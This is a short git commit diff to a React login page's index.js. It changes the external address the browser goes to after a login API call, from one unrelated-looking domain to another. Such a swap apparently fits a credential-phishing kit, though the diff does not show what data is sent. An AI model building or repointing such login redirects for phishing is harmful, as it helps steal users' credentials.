79396a26a63d63f5086ab05dc5f167b59d89224e
husknet <127146284+husknet@users.noreply.github.com>
2025-01-30 09:29:10 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://tag.mccsltds.com/';
+      window.location.href = 'https://tbb.lmmeublesroussin.com/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
